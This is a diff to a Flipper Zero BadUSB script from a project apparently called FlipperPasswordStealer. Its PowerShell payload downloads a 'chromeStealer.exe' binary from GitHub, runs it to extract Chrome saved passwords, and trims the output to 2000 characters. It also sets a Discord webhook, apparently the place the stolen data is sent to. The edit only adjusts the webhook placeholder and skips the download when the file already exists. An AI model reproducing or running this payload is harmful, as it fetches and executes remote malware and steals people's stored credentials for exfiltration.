@@ -1,10 +1,10 @@
 let badusb = require("badusb");
 
 let script=[
-   "$webhookUrl = '<discordWebhookURL>';",
+   "$webhookUrl = '<discordwebhook>';",
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chromeStealer.exe';",
    "$exePath = '.\\chromeStealer.exe';",
-   "Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;",
+    "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
    "$commandOutput = & $exePath;",
    "$commandOutput = & '.\\chromeStealer.exe';",
     "if ($commandOutput.Length -gt 2000) {$commandOutput = $commandOutput.Substring(0, 2000)}",
